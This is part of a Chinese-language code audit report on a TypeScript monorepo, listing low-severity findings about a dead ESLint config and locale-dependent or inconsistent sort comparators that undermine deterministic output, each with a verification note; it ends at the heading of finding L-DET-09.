**验证备注**: 已直接在源码中核实,且支撑事实比审查者陈述的更充分。.eslintrc.cjs 已被 git 跟踪,内容与引用完全一致(extends eslint:recommended、@typescript-eslint/recommended、plugin:react/recommended、plugin:react-hooks/recommended、plugin:storybook/recommended;rules 中包含 '@typescript-eslint/no-explicit-any': 'error'),`git log -- .eslintrc.cjs` 确认最后一次提交是 296080f3 `chore(lint): ban explicit any across the codebase`。eslint 在 apps/web、apps/cli、apps/vscode 和 packages/eslint-plugin-prodivix 中均锁定为 ^9.39.4。唯一带有 `lint` 脚本的包是 apps/cli、apps/vscode、apps/web 和根目录;三个 app 都自带 flat 配置(apps/cli/eslint.config.js、apps/vscode/eslint.config.mjs、apps/web/eslint.config.js),而根目录的 `lint` 是 `turbo run lint` 加上若干 node 边界脚本,没有根级 flat 配置 —— 因此没有任何路径会解析到 .eslintrc.cjs。`git grep ESLINT_USE_FLAT_CONFIG` 在全仓库返回零结果,所以 eslintrc 模式从未被强制启用。所述矛盾属实:apps/web/eslint.config.js:26 设置了 'react-hooks/exhaustive-deps': 'off',而 .eslintrc.cjs 引入的 plugin:react-hooks/recommended 会启用它。另有一项本意为反驳、结果反而强化该结论的发现:extends 中的 '@typescript-eslint/recommended' 即便按 eslintrc 格式也是错误写法 —— ESLint 会把带作用域的裸名解析为 '@typescript-eslint/eslint-config-recommended',而它并不存在(eslintrc 的正确写法是 'plugin:@typescript-eslint/recommended')—— 因此即使在 ESLINT_USE_FLAT_CONFIG=false 下,该文件也会直接硬报错而不是生效。它无疑是死配置。限制严重程度的缓解因素:apps/web/README.md 已把 'apps/web/eslint.config.js' 记载为 no-explicit-any 的权威规则入口,因此误导策略的风险被部分抵消。`low` 成立。

#### 4.4.4 确定性(determinism)

##### L-DET-01 针对三种操作类型的排序比较器不自洽,使生成的 Vue 数据操作 manifest 顺序由实现决定

- **位置**: [`packages/prodivix-compiler/src/vue/workspaceProject.ts:118`](packages/prodivix-compiler/src/vue/workspaceProject.ts#L118)
- **类别**: determinism ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-compiler-targets`

**详情**: 该比较器只区分 `'query'` 与其他类型,因此对于 `mutation`/`subscription` 这一对,它在*两个方向*上都返回 `1`:`compare(mutation, subscription) === 1` 且 `compare(subscription, mutation) === 1`。当比较器违反反对称性时,`Array.prototype.sort` 会产生由实现决定的顺序,因此烘焙进 `src/prodivix-data-operations.ts` 的数组(以及由它派生的每一个 `JSON.stringify(operations)`)不再是 Workspace 的确定性函数 —— 它取决于引擎的排序实现和排序前的输入顺序。这破坏了该文件其他部分刻意维持的可重现导出契约(别处对路径/id 一律使用 `compareText`)。

**失败场景**: 某个 Workspace 的数据源中至少包含一个 `mutation` 和一个 `subscription` 操作。在不同 Node/V8 版本下(或在新增一个无关文档、改变了数组长度从而改变 V8 的插入排序/TimSort 路径之后),对同一个 Workspace snapshot 两次运行 `generateWorkspaceVueViteBundle`,生成的 `src/prodivix-data-operations.ts` 中 mutation 与 subscription 条目的相对顺序会不同,在导出的项目以及任何导出哈希/golden 比对中产生虚假差异。

**修复建议**: 对类型使用全序,例如 `const kindRank = { query: 0, mutation: 1, subscription: 2 } as const;`,然后 `.sort((left, right) => kindRank[left.kind] - kindRank[right.kind] || compareText(left.key, right.key))`。

**验证备注**: 证据与第 116-119 行吻合。我执行了该比较器:`compare(mutation, subscription) === 1` 且 `compare(subscription, mutation) === 1`,反对称性被违反,ECMAScript 因而将结果留给实现决定。我还通过实测证明了实际后果 —— 输入 `[m:'y', s:'b', m:'a']` 排序后仍为 `m:'y', s:'b', m:'a'`,即连两个*同类型*的 mutation 也没有按 key 排序;输入 `[m:'z', s:'a', m:'b', s:'y']` 则被原封不动返回。因此生成的 `src/prodivix-data-operations.ts` 数组并不是周边 `compareText` 规范所期望的按 key 排序的序列,其顺序取决于 V8 的排序路径。严重级别已下调:在固定引擎内结果仍是(已按确定性方式预排序的)输入的确定性函数,因此不会出现同引擎下的 golden/导出哈希抖动;而且顺序不承载语义 —— 每个消费方都按标识而非位置选取(第 342、348、387、395、403 行的 `operations.find` 都按 documentId + operationId + kind 匹配,manifest 也通过 `prodivixDataOperationByKey` 消费)。影响是生成的 manifest 顺序不当,外加理论上的跨 Node 版本字节差异,而非输出损坏。

##### L-DET-02 生成的 server runtime 中 `canonicalJson` 用 `localeCompare` 对对象键排序,导致幂等 fingerprint 与 fixture 匹配并非 canonical

- **位置**: [`packages/prodivix-compiler/src/react/standaloneServerRuntime.ts:217`](packages/prodivix-compiler/src/react/standaloneServerRuntime.ts#L217)
- **类别**: determinism ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-compiler-targets`

**详情**: 生成的 Server Function 运行时中的 `canonicalJson` 使用 `left.localeCompare(right)` 对对象键排序,与本包中其他所有 canonical 序列化器不同(例如 `standaloneDataRuntime.ts:173` 使用码元顺序)。对于仅在完全可忽略码点上有差异的字符串,ICU 排序规则会返回 `0`,而 `Array.prototype.sort` 是稳定的,因此这类键对的最终顺序会退回 `Object.entries` 的插入顺序,而不是 canonical 顺序。该结果在两处被用作相等性键:mutation 重放的 `fingerprint`(第 432 行)和确定性 fixture 的输入匹配(第 451 行)。

**失败场景**: 某输入对象同时包含 `"note"` 与 `"note​"`(零宽空格 —— 复制表单数据时很可能产生的残留)。在完整 ICU 下 `'note'.localeCompare('note​')` 返回 0,因此这两个键保持插入顺序。两次携带相同逻辑载荷但键构造顺序不同的调用会产生不同的 `canonicalJson` 字符串;在 `invocationId` 相同的情况下,第二次尝试会被以 `SVR_TEST_REPLAY_CONFLICT` 拒绝,而不是重放缓存的结果,同时用 `input` 声明的 fixture 也不再匹配。

**修复建议**: 改用生成的运行时中别处已在使用的码元比较器:`.sort(([left], [right]) => left < right ? -1 : left > right ? 1 : 0)`。

**验证备注**: 引用与 standaloneServerRuntime.ts:213-219 原样吻合。已在 Node(ICU 78.3)中验证 'note'.localeCompare('note​') === 0,并且由于 Array.prototype.sort 是稳定的,两个以相反插入顺序持有这两个键的对象会 canonical 化为不同的字符串 —— 因此 canonicalJson 确实依赖顺序,不同于同文件生成器一侧使用的码元比较器(compareText,第 14 行)以及同类生成器 standaloneDataRuntime.ts:173。该文件中的 cloneJson 会保留插入顺序(通过 Object.entries 映射),因此排序是唯一的归一化步骤,而两个消费方(fingerprint 第 432 行、fixture 输入匹配第 451 行)都把该字符串用作相等性键。没有任何守卫可以阻止它:键只由每个定义各自的 Ajv inputSchema 检查。审查者遗漏的缓解因素:这两处用法都位于 executeDeterministicTestServerFunction 内部,只有在 target.kind === 'deterministic-test' 时才可达;生产的远程网关路径从不调用 canonicalJson,且触发条件要求同一个对象中存在两个仅在排序规则可忽略码点上有差异的键。属于真实缺陷,评级 low 正确。

##### L-DET-03 生成的 import 语句顺序以及每一份导出 manifest 的列表都使用依赖区域设置的 localeCompare,导致导出产物不可复现

- **位置**: [`packages/prodivix-compiler/src/export/importPlanner.ts:43`](packages/prodivix-compiler/src/export/importPlanner.ts#L43)
- **类别**: determinism ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-compiler-core`

**详情**: `dedupeExportImportIntents` 使用 `String.prototype.localeCompare`(未显式指定 locale)对每个生成源码模块渲染出的 import 语句排序,而 `ProductionExportPlanner.moduleToFile` 直接把该数组拼接进输出的文件内容(planner.ts:971-984)。不带 locale 参数的 `localeCompare` 使用宿主默认排序规则(浏览器 `navigator.language` / Node ICU + `LANG`),它不是码点顺序,并且随区域设置而不同。同样的模式还决定了 `.prodivix/export-manifest.json`、`.prodivix/origins.json` 和 `.prodivix/licenses.json` 的序列化顺序(planner.ts:150、153、169-171、269、271、289、293、308、311、349、353-356),以及 `mergeExportDependencies`(dependencyPlanner.ts:45)的顺序,也就是 `package.json` 依赖键的顺序。由于 `hashExportFileContents` 对输出的字节做哈希(planner.ts:397-405),记录的 `contentHash` 会随导出用户的区域设置而变化。代码库中已经为此存在码点比较器(isolatedServerFunctionImportGraph.ts:48 中的 `compareText`、react/workspaceProject.ts 中的 `compareUnicodeCodePoints`),说明该不变量在别处已被承认。

**失败场景**: 某模块 import 了 `{ Chart } from './Chart'` 和 `{ Hue } from './Hue'`。在 `en-US` 排序规则下,渲染出的字符串把 `import { Chart } ...` 排在 `import { Hue } ...` 之前;而在 `cs-CZ` 下,由于二合字母 "ch" 排在 "h" 之后,顺序会反转。因此同一个 Workspace revision 在捷克语区域设置的浏览器中导出,会为 `src/components/.../X.tsx` 产生不同的字节、在 `.prodivix/export-manifest.json` 中产生不同的 `contentHash`,以及不同的 `.prodivix/origins.json` —— 破坏按字节比对的 golden-conformance 关卡,以及任何以内容哈希为键的缓存或对同一 revision 两次导出的 diff。

**修复建议**: 把导出/序列化路径上的每一处 `localeCompare` 替换为码点比较器(复用 `compareUnicodeCodePoints`,或 `isolatedServerFunctionImportGraph.ts` 中已使用的 `left < right ? -1 : left > right ? 1 : 0` 形式),并添加一条 lint 规则,禁止在 `packages/prodivix-compiler/src` 内使用 `localeCompare`。

**验证备注**: 代码与引用完全一致:importPlanner.ts:43-45 使用区域设置默认的 String.prototype.localeCompare 对渲染后的 import 语句排序,planner.ts:971-973 直接把 module.renderedImports 拼接进输出内容,同一个默认区域比较器还驱动 dependencyPlanner.ts:45(package.json 键顺序)以及 planner.ts:150、153、269、271、289、293、308、311、349、353-356 的 manifest/origins/licenses 汇总。hashExportFileContents(planner.ts:397-405)确实对输出字节做哈希,因此 contentHash 会继承排序结果。所称的捷克语 'ch' 二合字母例子符合真实排序行为,而不带 locale 参数的 localeCompare 确实使用宿主默认 locale,因此跨环境的字节分歧是真实的 —— 导出在客户端 ExportCode.tsx 中运行,也就是运行在用户浏览器所报告的区域设置下。我还确认代码库确实有码点比较器(react/workspaceProject.ts:184 的 compareUnicodeCodePoints、isolatedServerFunctionImportGraph.ts:48 的 compareText),所以该不变量在别处已被承认。夸大之处在于严重级别。在任一单一环境内顺序完全确定(Array.prototype.sort 是稳定的,Map 插入顺序由输入决定),因此不存在不稳定问题。我在编译器之外 grep 了 contentHash 的消费方,一处也没有找到 —— 目前没有任何缓存、diff 或关卡会比较在不同环境中产生的两份导出,所以所断言的“破坏按字节比对的 golden-conformance 关卡”并不对应任何现存关卡(CI 只跑一种区域设置)。specs/roadmap/global-phases.md 把“可复现产物”列在 G3 这一未来阶段之下,而不是当前要求。import 顺序对生成代码也没有语义影响;唯一对顺序敏感的情形是带副作用的 CSS import(stylePlanner.ts:118-136),而那里一个模块最多只会拿到自己的组件样式表加上唯一的全局样式表。真实的可复现性缺陷,影响仅限于顺序,故为 low。

##### L-DET-04 Canonical 执行记录使用 localeCompare 排序,因此相同输入在不同宿主区域设置下序列化结果不同

- **位置**: [`packages/runtime-core/src/executionRequest.ts:68`](packages/runtime-core/src/executionRequest.ts#L68)
- **类别**: determinism ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-runtime-core`

**详情**: `normalizeStringRecord` 是 `ExecutionRequest.workspace.partitionRevisions` 和 `ExecutionRequest.metadata` 的规范化器;它用 `left.localeCompare(right)` 排序条目,然后用 `Object.fromEntries` 重建对象,因此 canonical 传输记录的键插入顺序依赖宿主区域设置。同样的模式还出现在 `executionEnvironmentResolution.ts:246`(`cloneExecutionValue`,它对 `readPublicBinding` 返回的每个 public 绑定值的键排序)、`executionEnvironmentResolution.ts:272`(`normalizeSnapshot` 的 public 绑定)、`executionConsole.ts:744`(Console 记录的次序决胜)、`executionSession.ts:531` 以及 `executionProviderRegistry.ts:93/104`。仓库已经把它当作一类缺陷来对待:`packages/runtime-core/src/__tests__/executableProject.property.test.ts:205` 给 `String.prototype.localeCompare` 打补丁使其抛出异常,以断言 executable-project 摘要路径从不触碰它,而 `executableProjectNormalization.ts:54` 导出了 `compareExecutableProjectText` 作为码元顺序的替代方案 —— 但 request/environment 的规范化器没有被迁移。

**失败场景**: 某个 workspace 有分区键 `'z-partition'` 和 `'ä-partition'`。在使用 `en-US` 排序器的浏览器上,`createExecutionRequest` 输出 `{'ä-partition':…, 'z-partition':…}`;而在 `sv-SE` 宿主上,同一次调用输出 `{'z-partition':…, 'ä-partition':…}`,因为瑞典语排序把 'ä' 排在 'z' 之后。因此对于两个向远程 runner 发出逻辑相同请求的客户端,`JSON.stringify(request)` 会逐字节不同,于是传输载荷、重放的请求日志以及对该请求的任何下游内容寻址都无法跨区域/跨宿主复现。同样的隐患也适用于 `readPublicBinding` 返回对象的键顺序,而它会流入运行时配置。

**修复建议**: 把规范化路径上的每一处 `localeCompare` 替换为现有的码元比较器(executableProjectNormalization.ts 中的 `compareExecutableProjectText`,或简单的 `left < right ? -1 : left > right ? 1 : 0`),并把区域设置无关性的 property 测试扩展到覆盖 `createExecutionRequest`、`normalizeSnapshot` 和环境侧的 `cloneExecutionValue`。

**验证备注**: 证据与文件完全一致:packages/runtime-core/src/executionRequest.ts:58-70 包含 normalizeStringRecord,其第 68 行为 `.sort(([left],[right]) => left.localeCompare(right))`,结果送入 Object.freeze(Object.fromEntries(entries)),并规范化 ExecutionRequest.workspace.partitionRevisions(第 143 行)和 ExecutionRequest.metadata(第 147 行)。所有次要引用均已核实:executionEnvironmentResolution.ts:246/272/314、executionConsole.ts:744、executionSession.ts:531、executionProviderRegistry.ts:93/104、**tests**/executableProject.property.test.ts:205-230 的反区域设置回归测试,以及 executableProjectNormalization.ts:54 的 compareExecutableProjectText。确定性前提是成立的,而且仓库自身的设计确认插入顺序就是规范化契约:executableProject.ts:197 定义 `canonicalJson = JSON.stringify`,createContentDigest(284-309)直接对 canonicalJson(input.workspace) 做哈希,而**同一个** partitionRevisions 形态的另外两个同级规范化器已经避开了区域设置(executableProjectNormalization.ts:691-693 使用 compareExecutableProjectText;executionFilesystemDiff.ts:218-220 使用内联的码元比较)。executionRequest.ts 是尚未迁移的例外,而非 ASCII 的分区键确实可达,因为 apps/web/src/editor/features/execution/workspaceExecutionIdentity.ts:24-36 把键构造为 `document:${document.id}:content`。**但是**所声称的后果被夸大了,这部分我予以反驳:我检索了 packages/runtime-core、apps/remote-runner-worker 和 apps/remote-runner-control-plane 中的每一处摘要/哈希/签名点,没有任何一处会对 ExecutionRequest 做哈希、签名或按字节比较。摘要要么针对 ExecutableProjectSnapshot.contentDigest(区域设置无关路径)、原始文件字节,要么针对标量(executionEnvironmentResolution.ts:82-91 的 createExecutionEnvironmentPrincipalPartitionId 对两个标量做长度前缀处理);regionalRecoverySignedProof.ts 签的是一个 proof claim,并在签名时通过它自己的 stableJson 重新序列化。每个消费方都按字段名读取请求(workerAgent.ts:176/343/476/609/740-741、executionSession.ts:279-300/573-576/640-643),而 readPublicBinding(reference, field) 返回单个字段,因此排序后克隆对象的键顺序也没有任何读取方。所以这是一处真实的潜在规范化不一致,且仓库内已有可用修复方案,而不是可复现性或数据损坏故障。我能站得住脚的结论正是所声称的 low 严重级别。

##### L-DET-05 Canonical 记录键排序使用区域设置敏感的 `localeCompare`,使 control plane 的执行身份键在不同副本/运行时之间不具确定性

- **位置**: [`packages/runtime-remote/src/remoteExecutionCodecPrimitives.ts:126`](packages/runtime-remote/src/remoteExecutionCodecPrimitives.ts#L126)
- **类别**: determinism ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-runtime-remote`

**详情**: `stringRecord`(用于 `request.metadata` 和 `workspace.partitionRevisions`)与 `executionValue`(用于 `invocation.input`、日志 `data`/`arguments`、诊断 `meta`)使用 `String.prototype.localeCompare` 且不指定 locale 来规范化对象键顺序。不带 locale 的 `localeCompare` 依赖宿主默认区域设置以及 ICU/CLDR 版本,并且对排序相等但实际不同的字符串(例如 NFC 与 NFD 形式)返回 0,此时稳定排序会静默保留输入顺序,而不是产生 canonical 顺序。该 codec 产出的解码后请求随后被 `remoteExecutionControlPlane.ts:161-184` 中的 `identityKey` 原样哈希(`JSON.stringify({ request, snapshotDigest, serverAuthority })`),而该哈希正是持久化为 `remote_executions.identity_key` 的幂等键,并在每次重试时被比较(`createOrGet`:`existing.identity_key === input.identityKey ? existing : identity-conflict`)。

**失败场景**: 某个 `ExecutionRequest` 携带 `metadata: { "api": "v1", "API_KEY_ID": "k1" }`。control plane 副本 A 运行的 Node 带完整 ICU 且 `LANG=en_US.UTF-8`:`localeCompare` 得到顺序 `["api", "API_KEY_ID"]`(在 primary 强度下更短的前缀在前)。副本 B 运行的是用 `--without-intl` 构建的同一镜像(或被滚动到了 CLDR 更新的 Node),此时比较退化为码元顺序,得到 `["API_KEY_ID", "api"]`。由 A 处理的 `create` 存储了身份键 K1。客户端对*同一个* `requestId` 和 snapshot 的重试落到 B,B 计算出 K2 != K1,于是 `createOrGet` 返回 `identity-conflict`。客户端抛出不可重试的 `RemoteExecutionClientError('identity-conflict')`,`createRemoteExecutionRecoveryPlan` 返回 `status: 'blocked', reason: 'non-retryable'` —— 该执行在这个请求身份下再也无法恢复或重新创建。

**修复建议**: 在 `stringRecord` 和 `executionValue` 中把 `left.localeCompare(right)` 换成区域设置无关的比较(`left < right ? -1 : left > right ? 1 : 0`,即 UTF-16 码元顺序)。这也是每个非 JS 对等方(Go 后端、Postgres)自然会产生的顺序,而且它是全序,因此不会有两个不同的键比较相等。

**验证备注**: 证据与 remoteExecutionCodecPrimitives.ts:119-128 一致(同样的 localeCompare 规范化也出现在 executionValue 的第 180 行)。通向持久键的链路是真实的:remoteExecutionControlPlane.ts:161-184 对 JSON.stringify({request,...}) 做哈希并存为 remote_executions.identity_key,createOrGet/getByOwnerRequest 在重试时原样比较它(postgresExecutionRepository.ts:293),不匹配则返回 identity-conflict —— 这是一个不可重试的客户端错误。不带显式 locale 的 localeCompare 确实依赖 ICU/区域设置(审查者的 'api' vs 'API_KEY_ID' 例子是正确的:ICU 根排序规则得到 [api, API_KEY_ID],码元顺序得到 [API_KEY_ID, api])。有两处修正会降低严重级别:(1)所引用的 stringRecord 实际上并不是 request.metadata/partitionRevisions 的生效规范化器 —— createExecutionRequest 会用它自己的 localeCompare 在 packages/runtime-core/src/executionRequest.ts:63-69 中重新规范化并重新排序两者,因此 codec 的排序被覆盖;这里真正决定的只有 invocation.input 的顺序(executionValue,第 180 行,由 cloneExecutionValue 保留)。(2)可达性要求 control plane 各副本具有不同的 ICU 构建或默认区域设置,而同一次部署的各副本通常共享同一镜像,并且 identityKey 只由这一份 TypeScript 实现计算(没有 Go 或其他语言的对等方计算它,已通过 grep identity_key 确认)。localeCompare 也是全仓库通行的排序惯用法(100 多个调用点),因此这更像是系统性的规范化卫生问题,而不是一个针对性的 bug。真实的潜在确定性缺陷,但严重级别为 low。

##### L-DET-06 区域恢复的 scope 与证据摘要使用区域设置敏感的 `localeCompare` 对执行 id 排序,因此摘要在不同宿主上不同

- **位置**: [`packages/runtime-remote/src/remoteExecutionRegionalRecoveryOperator.ts:80`](packages/runtime-remote/src/remoteExecutionRegionalRecoveryOperator.ts#L80)
- **类别**: determinism ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-runtime-remote`

**详情**: `createRemoteExecutionRegionalRecoveryExecutionSetDigest` 在哈希之前用 `localeCompare` 对执行 id 排序,该模块的 `stableJson`(第 54 行)也用同样方式对对象键排序;`remoteExecutionRegionalRecoveryEvidence.ts:18` 为 `evidenceDigest` 校验复制了同一份 `stableJson`。执行 id 只按 `/^[A-Za-z0-9][A-Za-z0-9._:-]{0,255}$/` 校验,因此大小写混合和标点都是合法的 —— 而这正是 ICU 排序与码元顺序发生分歧、以及不同默认区域设置(或 ICU/CLDR 版本)彼此分歧的输入。这些摘要是明确的跨进程契约:`createRemoteExecutionRegionalRecoveryAuthorizationScopeDigest` 被导出并由签名授权凭证端口消费(`apps/remote-runner-control-plane/src/regionalRecoverySignedProof.ts`),而 `readRemoteExecutionRegionalRecoveryOperatorEvidence` 会重新计算 `digest(unsigned)` 来校验可能在另一台宿主上产生的证据。

**失败场景**: 某个故障转移批次包含 `executionIds: ['Exec-10', 'exec-2']`。operator 作业运行在带完整 ICU 且 `LANG=en_US.UTF-8` 的容器中,把它们排序为 `['exec-2', 'Exec-10']` 并产生 scope 摘要 D1;而授权签名工具运行在 `LANG=C`/无 ICU 排序的宿主上,把它们排序为 `['Exec-10', 'exec-2']` 并签署 scope 摘要 D2 != D1。`validAuthorization` 比较 `decision.scopeDigest === scopeDigest` 时失败,operator 抛出 `authorization-invalid` —— 区域切换根本无法被授权。同样的不匹配会让 `readRemoteExecutionRegionalRecoveryOperatorEvidence` 在配置不同的宿主上审计时拒绝一条本来有效的证据记录。

**修复建议**: 对每一个摘要输入都使用区域设置无关的全序:`executionIds.sort((left, right) => (left < right ? -1 : left > right ? 1 : 0))`,并在三份 `stableJson` 实现(operator、evidence codec、request codec)中使用同一个比较器。最好抽出一个共享的 canonical JSON 辅助函数,使这三份副本不会再漂移。

**验证备注**: 证据与 remoteExecutionRegionalRecoveryOperator.ts:75-81 一致,重复的 localeCompare stableJson 确实存在于第 54 行、remoteExecutionRegionalRecoveryEvidence.ts:18,以及 apps/remote-runner-control-plane/src/regionalRecoverySignedProof.ts:74。跨宿主契约是真实且有文档的:docs/operations/regional-recovery.md 指出签发方必须用 createRemoteExecutionRegionalRecoveryAuthorizationScope/...ScopeDigest 构建 scope 并在隔离系统中签名,而 regionalRecoverySignedProof.ts:382 会把 claim.scopeDigest 与本地重新计算的 scopeDigest(scope) 比较。有两处修正。第一,影响比所称的更窄:我检查了流经 stableJson 的每一组对象键(scope、evidence base、outcomes、rpo、timing)—— 它们全都是固定的 lowerCamelCase ASCII 标识符,首个不同字符都是小写对小写,而在这种情况下 ICU 根排序与码元顺序一致,因此证据摘要和 scope 对象摘要实际上是顺序稳定的。只有所引用第 80 行处对用户提供的 executionIds 数组的排序才作用于会导致排序分歧的输入,所以引用的位置正确,但该主张中关于证据校验的那一半不成立。第二,审查者的例子是错的:'Exec-10' 与 'exec-2' 在 ICU 和码元顺序下的排序结果相同(两者都把 'Exec-10' 排在前面,因为 ICU 在 primary 强度下比较 '1'<'2',码元顺序比较 'E'<'e')。要产生分歧需要首字符大小写不同(例如 ['B-exec','a-exec'] -> ICU 得到 ['a-exec','B-exec'],码元顺序得到 ['B-exec','a-exec'])。另外,scope 摘要不匹配会使 consume 返回 {kind:'denied'},因此 operator 抛出的是 'authorization-denied'(第 809-812 行),而不是 'authorization-invalid'。要真正出现该问题,还需要签名宿主与 operator 宿主具有不同的 ICU/排序配置,而这属于我无法观察到的部署状态 —— 所以是 low,而不是 medium。

##### L-DET-07 decodeServerRuntimeProfile 使用依赖宿主区域设置的 localeCompare 排序规范化的 functionsByExport / secretsByField 映射,导致持久化的 profile 字节在不同机器上不可复现

- **位置**: [`packages/server-runtime/src/serverRuntimeProfile.ts:278`](packages/server-runtime/src/serverRuntimeProfile.ts#L278)
- **类别**: determinism ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-server-assets-tokens`

**详情**: `decodeServerRuntimeProfile`(第 278 行)和 `readEnvironmentPolicy`(第 164 行)用 `left.localeCompare(right)` 对条目排序,并按该顺序重建对象。`String.prototype.localeCompare` 在不传 locale 参数时使用宿主默认区域设置(ICU / `LANG`),而它对纯 ASCII 标识符的排序结果也会不同:已在 node 中验证,`['z','aa'].sort((a,b)=>a.localeCompare(b))` 在默认英文区域下得到 `['aa','z']`,而在 `da-DK` 下得到 `['z','aa']`。由此产生的插入顺序就是 `writeServerRuntimeProfile` 所返回对象的键顺序,该对象会作为 Code artifact 元数据存储并被 JSON 序列化进文档内容(持久化形态见 apps/backend/internal/modules/remoteexecution/isolated_secret_broker_test.go:94)。同一个包已经在 serverRuntimeAuthConfiguration.ts:30 中为此定义了显式的按码元比较的 `compareText`,因此这偏离了项目自身的规范化约定。

**失败场景**: 两名开发者保存同一个声明了导出 `aa` 与 `z` 的 Code artifact。在 `LANG=en_US.UTF-8` 的机器上元数据序列化为 `{"functionsByExport":{"aa":…,"z":…}}`;在 `LANG=da_DK.UTF-8` 上则序列化为 `{"functionsByExport":{"z":…,"aa":…}}`。文档内容字节不同但语义没有任何变化,从而产生一个虚假的内容 revision、一次虚假的 Git/导出 diff,以及下一次 Atomic Commit 时的假冲突。

**修复建议**: 把两处 `localeCompare` 调用替换为该包中与区域设置无关的 `compareText`(`left < right ? -1 : left > right ? 1 : 0`),与 serverRuntimeAuthConfiguration.ts 和 binaryAssetGitProjection.ts 保持一致。

**验证备注**: 代码事实属实:serverRuntimeProfile.ts:278 和 :164 都使用裸 `left.localeCompare(right)` 排序并按该顺序重建对象,而同一个包在 serverRuntimeAuthConfiguration.ts:30 定义了按码元比较的 `compareText`。我在 node v26 中验证了区域差异:`['z','aa'].sort((a,b)=>a.localeCompare(b))` 默认得到 `['aa','z']`,而使用 'da-DK' 得到 `['z','aa']`。因此对项目自身规范化约定的偏离是真实的。但所述失败场景并未成立。(a)没有任何生产路径会重新序列化一个多条目映射:仅有的三个 `writeServerRuntimeProfile` 调用方是 workspaceServerRuntimeAuthoring.ts:560、workspaceServerRuntimeReadSecretAuthoring.ts:126 和 workspaceServerRuntimeSourceMutationAuthoring.ts:212 中的预设,它们各自只构造一个 `functionsByExport` 条目(密钥加载器还有恰好一个 `secretsByField` 条目)——只有一个键时排序是空操作。手工编写的多导出元数据只会被解码器读取(isWorkspaceCodeDocumentContent、编译器、隔离运行时),从不被改写,因此用户自己的键顺序原样保留。(b)持久化字节这一论点在后端还被进一步削弱:`normalizeWorkspaceDocumentContent` -> `normalizeJSONDocument`(apps/backend/internal/modules/workspace/store_helpers.go:304-343,在 store_snapshot.go:84 使用)会把内容解码为 `any` 再用 Go 的 `encoding/json` 重新编码,而后者按字节序输出 map 键,从而把客户端发来的任何顺序规范化。因此“两名开发者产生不同的持久化字节 / 虚假 revision / 假冲突”未获证实。严重级别由 medium 修正为 low:这是规范化代码中真实存在、值得通过换用 `compareText` 修复的潜在不确定性,但今天没有可观察的生产影响。

##### L-DET-08 Issue 排序与代表性诊断的选取依赖区域设置

- **位置**: [`packages/diagnostics/src/diagnosticIssueCollection.ts:91`](packages/diagnostics/src/diagnosticIssueCollection.ts#L91)
- **类别**: determinism ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-authoring-lang`

**详情**: `compareDiagnostic` 用 `String.prototype.localeCompare` 且不指定 locale/collator 对序列化后的诊断排序,`compareIssue`(第 109-115 行)对 `domain`、`code` 和 `fingerprint` 也是如此。`rebuildIssues` 两次以语义性(而不仅是外观性)的目的使用 `compareDiagnostic`:第 152 行决定在某个 provider snapshot 内由哪个诊断实例代表一个 fingerprint,第 183 行对合并后的诊断排序,使 `groupedIssue.diagnostics[0]`(第 189 行)成为该 issue 展示的 `diagnostic`。默认的 `localeCompare` 使用宿主的 ICU 排序规则,其对大小写和重音的排序不同于代码库其他各处使用的码元排序(`compareSemanticText`、`compareText`、`compareShaderText`)。

**失败场景**: 同一 provider 的两条诊断共享一个 fingerprint(code/domain/targetRef/sourceSpan 相同,消息不同,例如 `'Type error'` 和 `'type mismatch'`)。在默认 ICU 排序器下 `'Type error'.localeCompare('type mismatch')` 为负(一级强度不区分大小写),因此 `'Type error'` 被选为代表;按码元比较时 `'Type error' < 'type mismatch'` 同样成立,但对 `'unknown name'` 与 `'Unknown Name'`,两种排序结果不一致。因此相同的 provider snapshot 会因浏览器/操作系统区域设置不同而产生不同的可见 issue 消息和不同的 Issues 面板排序,任何针对 Issues 投影的 golden/一致性比较都会变得依赖环境。

**修复建议**: 把 `localeCompare` 替换为仓库其余部分统一使用的确定性码元比较(`left < right ? -1 : left > right ? 1 : 0`),或者固定一个由两个比较器共享的显式 `Intl.Collator('en-US', { sensitivity: 'variant' })` 实例。

**验证备注**: 引用证据与 packages/diagnostics/src/diagnosticIssueCollection.ts:91-93 原样吻合,第 109-115、152、183、189 行也如描述所述。不带 locale/collator 参数的 localeCompare 使用宿主默认 ICU 区域设置,因此排序依赖环境。可达性比审查者论证的更强,且并不需要 fingerprint 冲突:compareIssue(第 115 行)会一直下沉到 fingerprint.localeCompare,而 fingerprint 是经 stableSerialize 的 JSON,包含用户可控文本(targetRef 节点 id、protocolPath,以及无位置信息时的 message)。apps/web/src/editor/features/issues/WorkspaceIssuesPage.tsx:108/131 按集合顺序渲染 queryDiagnosticIssues 的输出且不再排序,第 140 行取 issues[0] 作为默认选中的 issue,因此宿主区域设置同时改变 Issues 列表顺序和默认打开的是哪一条 issue。代表性选取路径也是真实的:createDiagnosticIssueFingerprint(第 57 行)在存在 targetRef/sourceSpan/protocolPath 时省略 message,因此两条严重级别相同、仅 hint/message 不同的诊断可以共享 fingerprint,而第 152 行随后用依赖区域设置的比较来挑选代表。不存在任何守卫:属性测试(diagnosticIssueCollection.property.test.ts)只断言与 provider 插入顺序无关,而整个包中没有任何 Intl.Collator。主张中的两条支撑论据被推翻,但不影响结论:(a)packages/golden-conformance 中不存在对 DiagnosticIssue 或 queryDiagnosticIssues 的任何引用,因此所称的一致性测试环境依赖是推测而非现状;(b)“与代码库约定不一致”的说法较弱,因为 localeCompare 在 packages/ 下的 62 个文件中出现,与 compareSemanticText/compareText 并存。影响仅限于展示排序以及展示哪条重复消息;没有任何东西被持久化,因此 low 是可辩护的上限。

##### L-DET-09 CodeSlot 投影使用依赖 locale 的 `localeCompare` 对 slot 排序,而非本包的确定性码元比较器

- **位置**: [`packages/nodegraph/src/authoring/nodeGraphCodeSlotProvider.ts:54`](packages/nodegraph/src/authoring/nodeGraphCodeSlotProvider.ts#L54)
